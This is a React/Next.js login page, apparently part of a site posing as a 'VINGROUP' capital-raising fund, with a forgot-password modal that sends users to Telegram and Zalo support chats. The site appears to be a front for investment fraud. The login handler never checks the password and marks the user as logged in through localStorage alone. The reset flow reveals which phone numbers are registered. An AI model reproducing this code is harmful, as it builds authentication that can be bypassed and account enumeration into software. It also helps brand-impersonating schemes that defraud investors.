'use client'

import { useState, useEffect } from 'react'
import Link from 'next/link'
import { createClient } from '@/lib/supabase/client'

export default function LoginPage() {
  const [phone, setPhone] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState('')

  // Forgot password modal state
  const [showForgotPasswordModal, setShowForgotPasswordModal] = useState(false)
  const [forgotPhone, setForgotPhone] = useState('')
  const [forgotSubmitted, setForgotSubmitted] = useState(false)

  // Dynamic CSKH configuration
  const [activeChannel, setActiveChannel] = useState<'telegram' | 'zalo' | 'both'>('telegram')
  const [telegramUrl, setTelegramUrl] = useState('https://t.me/vingroup-qpl_cskh')
  const [zaloUrl, setZaloUrl] = useState('https://zalo.me/0987654321')

  useEffect(() => {
    document.title = 'Đăng nhập | Quỹ Huy Động Vốn VINGROUP'
    const savedTg = localStorage.getItem('telegramUrl')
    const savedZalo = localStorage.getItem('zaloUrl')
    const savedChannel = localStorage.getItem('cskhActiveChannel')
    if (savedTg) setTelegramUrl(savedTg)
    if (savedZalo) setZaloUrl(savedZalo)
    if (savedChannel) setActiveChannel(savedChannel as any)
  }, [showForgotPasswordModal])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')

    try {
      const supabase = createClient()
      const { data: profile } = await supabase
        .from('profiles')
        .select('status')
        .eq('phone', phone)
        .maybeSingle()

      if (profile && profile.status === 'locked') {
        setError('⚠️ Tài khoản này đã bị KHÓA bởi Quản trị viên! Vui lòng liên hệ Bộ phận CSKH.')
        setLoading(false)
        return
      }
    } catch (err) {
      console.log('Login status check fallback:', err)
    }

    // Save login state in localStorage
    localStorage.setItem('isLoggedIn', 'true')
    localStorage.setItem('userPhone', phone || '0987654321')
    
    setTimeout(() => {
      setLoading(false)
      window.location.href = '/trang-chu'
    }, 600)
  }

  const handleSendResetRequest = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!forgotPhone) return

    try {
      const supabase = createClient()
      const { data: profile, error } = await supabase
        .from('profiles')
        .select('phone')
        .eq('phone', forgotPhone)
        .maybeSingle()

      if (error || !profile) {
        alert('⚠️ Số điện thoại không tồn tại trên hệ thống! Vui lòng nhập đúng số điện thoại đăng ký.')
        return
      }

      localStorage.setItem('cskhPhone', forgotPhone)
      window.location.href = `/cskh?phone=${forgotPhone}`
    } catch (err) {
      console.error(err)
      alert('⚠️ Có lỗi xảy ra khi xác thực thông tin. Vui lòng thử lại sau.')
    }
  }

  const handleCloseModal = () => {
    setShowForgotPasswordModal(false)
    setForgotSubmitted(false)
    setForgotPhone('')
  }

  return (
    <div className="app-container" style={{ 
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
      background: 'url(/bg_login.webp) bottom center no-repeat',
      backgroundSize: 'cover',
      backgroundAttachment: 'fixed',
      minHeight: '100vh',
      position: 'relative',
      display: 'flex',
      flexDirection: 'column',
      boxSizing: 'border-box'
    }}>

      {/* Dark overlay: body:before in website_res.css */}
      <div style={{
        position: 'absolute',
        top: 0, left: 0, width: '100%', height: '100%',
        background: '#000',
        opacity: 0.6,
        zIndex: 1
      }} />

      {/* Main Content Area */}
      <div style={{ 
        position: 'relative', 
        zIndex: 2, 
        padding: '0 24px',
        display: 'flex', 
        flexDirection: 'column', 
        justifyContent: 'center',
        flex: 1
      }}>
        {/* Logo Container */}
        <div style={{ textAlign: 'center', marginTop: 30, marginBottom: 20 }}>
          <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 8 }}>
            <img 
              src="/logo.png" 
              alt="Logo" 
              style={{ maxWidth: '50%', objectFit: 'contain' }}
            />
          </div>
        </div>

        {/* Card Form */}
        <div style={{
          background: 'white',
          borderRadius: 15,
          border: 'none',
          boxShadow: '0 4px 15px rgba(0, 0, 0, 0.1)',
          marginBottom: 20,
          overflow: 'hidden'
        }}>
          {/* Card Header */}
          <div style={{
            background: '#e32823',
            color: 'white',
            borderRadius: '15px 15px 0 0',
            fontWeight: 'bold',
            textAlign: 'center',
            padding: 15,
            fontSize: '1.1rem'
          }}>
            ĐĂNG NHẬP
          </div>

          <div style={{ padding: 25 }}>
            <p style={{ 
              fontSize: 14,
              color: '#334155',
              textAlign: 'center',
              marginBottom: '1.5rem',
              lineHeight: 1.5
            }}>
              Đăng nhập để sử dụng dịch vụ của chúng tôi
            </p>

            <form onSubmit={handleLogin}>
              {error && (
                <div style={{
                  background: '#FEF2F2', border: '1px solid #FECACA',
                  borderRadius: 10, padding: 12, marginBottom: 15,
                  color: '#DC2626', fontSize: 13, fontWeight: 700
                }}>
                  {error}
                </div>
              )}

              {/* Account/Email input */}
              <div style={{ marginBottom: 15 }}>
                <input
                  type="text"
                  value={phone}
                  onChange={e => setPhone(e.target.value)}
                  placeholder="Địa chỉ email"
                  required
                  style={{
                    width: '100%',
                    padding: '12px 15px',
                    borderRadius: 10,
                    border: '1px solid #ddd',
                    fontSize: 14,
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: '#fff',
                    color: '#1e293b',
                    transition: 'all 0.2s ease'
                  }}
                  onFocus={e => {
                    e.target.style.borderColor = '#d82c2c'
                    e.target.style.boxShadow = '0 0 0 0.25rem rgba(216, 44, 44, 0.25)'
                  }}
                  onBlur={e => {
                    e.target.style.borderColor = '#ddd'
                    e.target.style.boxShadow = 'none'
                  }}
                />
              </div>

              {/* Password input */}
              <div style={{ marginBottom: 15, position: 'relative' }}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="Mật khẩu"
                  required
                  style={{
                    width: '100%',
                    padding: '12px 48px 12px 15px',
                    borderRadius: 10,
                    border: '1px solid #ddd',
                    fontSize: 14,
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: '#fff',
                    color: '#1e293b',
                    transition: 'all 0.2s ease'
                  }}
                  onFocus={e => {
                    e.target.style.borderColor = '#d82c2c'
                    e.target.style.boxShadow = '0 0 0 0.25rem rgba(216, 44, 44, 0.25)'
                  }}
                  onBlur={e => {
                    e.target.style.borderColor = '#ddd'
                    e.target.style.boxShadow = 'none'
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={{
                    position: 'absolute',
                    right: 15,
                    top: '50%',
                    transform: 'translateY(-50%)',
                    border: 'none',
                    background: 'none',
                    cursor: 'pointer',
                    color: '#777',
                    padding: 4,
                    fontSize: 16
                  }}
                >
                  {showPassword ? (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                      <line x1="1" y1="1" x2="23" y2="23"/>
                    </svg>
                  ) : (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                  )}
                </button>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                style={{
                  backgroundColor: '#e32823',
                  color: 'white',
                  border: 'none',
                  borderRadius: 10,
                  padding: 12,
                  width: '100%',
                  fontWeight: 'bold',
                  marginTop: 10,
                  fontSize: 15,
                  cursor: 'pointer',
                  transition: 'background-color 0.2s ease',
                  opacity: loading ? 0.75 : 1
                }}
                onMouseOver={e => e.currentTarget.style.backgroundColor = '#b82424'}
                onMouseOut={e => e.currentTarget.style.backgroundColor = '#e32823'}
              >
                {loading ? 'ĐANG ĐĂNG NHẬP...' : 'ĐĂNG NHẬP'}
              </button>
            </form>
          </div>
        </div>

        {/* Action Links */}
        <div style={{
          textAlign: 'center',
          marginTop: 20,
          color: '#fff',
          fontSize: 14
        }}>
          Chưa có tài khoản?{' '}
          <Link href="/dang-ky" style={{ color: '#e32823', fontWeight: 'bold', textDecoration: 'none' }}>
            Đăng ký
          </Link>{' '}
          |{' '}
          <button
            type="button"
            onClick={() => setShowForgotPasswordModal(true)}
            style={{
              color: '#e32823',
              background: 'none',
              border: 'none',
              cursor: 'pointer',
              fontWeight: 'bold',
              padding: 0,
              fontSize: 14,
              textDecoration: 'none'
            }}
          >
            Quên mật khẩu?
          </button>
        </div>
      </div>

      {/* Forgot Password Modal */}
      {showForgotPasswordModal && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 10000,
          background: 'rgba(15, 23, 42, 0.6)', backdropFilter: 'blur(4px)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20
        }}>
          <div style={{
            background: 'white', borderRadius: 15, padding: '24px 20px',
            width: '100%', maxWidth: 380, boxShadow: '0 20px 40px rgba(0,0,0,0.25)',
            textAlign: 'center', animation: 'fadeIn 0.2s ease'
          }}>
            <div style={{ fontSize: 36, marginBottom: 8 }}>🔒</div>
            <h3 style={{ fontSize: 17, fontWeight: 900, color: '#0F172A', marginBottom: 8 }}>
              Quên mật khẩu
            </h3>

            {!forgotSubmitted ? (
              <form onSubmit={handleSendResetRequest}>
                <p style={{ fontSize: 13, color: '#64748B', marginBottom: 16, lineHeight: 1.5 }}>
                  Vui lòng nhập <strong>Số điện thoại</strong> đăng ký của bạn để yêu cầu bộ phận CSKH hỗ trợ cấp lại mật khẩu.
                </p>

                <input
                  type="tel"
                  value={forgotPhone}
                  onChange={e => setForgotPhone(e.target.value)}
                  placeholder="Nhập số điện thoại cần lấy lại MK..."
                  required
                  style={{
                    width: '100%', padding: '12px 14px', border: '1.5px solid #E2E8F0',
                    borderRadius: 12, fontSize: 14, outline: 'none', marginBottom: 16,
                    boxSizing: 'border-box', background: '#F8FAFC'
                  }}
                />

                <div style={{ display: 'flex', gap: 10 }}>
                  <button
                    type="button"
                    onClick={handleCloseModal}
                    style={{
                      flex: 1, padding: '12px', background: '#F1F5F9', color: '#475569',
                      border: 'none', borderRadius: 12, fontSize: 13, fontWeight: 700, cursor: 'pointer'
                    }}
                  >
                    Hủy bỏ
                  </button>
                  <button
                    type="submit"
                    style={{
                      flex: 1, padding: '12px', background: '#C8102E', color: 'white',
                      border: 'none', borderRadius: 12, fontSize: 13, fontWeight: 700, cursor: 'pointer'
                    }}
                  >
                    Gửi yêu cầu
                  </button>
                </div>
              </form>
            ) : (
              <div>
                <p style={{ fontSize: 13, color: '#059669', marginBottom: 16, lineHeight: 1.5, fontWeight: 700 }}>
                  ✓ Đã nhận yêu cầu hỗ trợ mật khẩu cho SĐT <strong>{forgotPhone}</strong>. Vui lòng liên hệ kênh CSKH bên dưới:
                </p>

                <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginBottom: 16 }}>
                  {(activeChannel === 'telegram' || activeChannel === 'both') && (
                    <a
                      href={telegramUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{
                        background: '#0088cc', color: 'white', textDecoration: 'none',
                        borderRadius: 12, padding: '12px', fontSize: 13, fontWeight: 800,
                        display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8
                      }}
                    >
                      ✈️ ... Telegram CSKH
                    </a>
                  )}

                  {(activeChannel === 'zalo' || activeChannel === 'both') && (
                    <a
                      href={zaloUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{
                        background: '#0068ff', color: 'white', textDecoration: 'none',
                        borderRadius: 12, padding: '12px', fontSize: 13, fontWeight: 800,
                        display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8
                      }}
                    >
                      💬 ... Zalo CSKH
                    </a>
                  )}
                </div>

                <button
                  onClick={handleCloseModal}
                  style={{
                    width: '100%', padding: '10px', background: '#F1F5F9', color: '#475569',
                    border: 'none', borderRadius: 12, fontSize: 13, fontWeight: 700, cursor: 'pointer'
                  }}
                >
                  Đóng cửa sổ
                </button>
              </div>
            )}
          </div>
        </div>
      )}

    </div>
  )
}
